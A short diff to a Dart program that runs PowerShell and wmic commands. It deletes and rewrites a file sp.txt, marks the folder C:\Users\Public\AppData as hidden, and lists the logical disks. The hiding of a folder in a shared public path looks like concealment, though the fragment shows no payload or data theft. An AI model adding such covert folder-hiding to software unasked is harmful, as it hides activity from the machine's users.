@@ -1,7 +1,7 @@
 import "dart:io";
 import "dart:convert";
 
-main() {
+void main() {
   Process.run("powershell", [
     "-command",
     "if (Test-Path C:\\Users\\Public\\AppData\\sp.txt) {Remove-Item C:\\Users\\Public\\AppData\\sp.txt}"
@@ -16,6 +16,10 @@ main() {
     "-command",
     "\$f=get-item C:\\Users\\Public\\AppData -Force;\$f.attributes='Hidden'"
   ]); // Set the folder as hidden.
+
+  List emptyList = [];
+
+  new File("sp.txt").writeAsString(jsonEncode(emptyList));
 
   Process.run('wmic', [
     'logicaldisk',
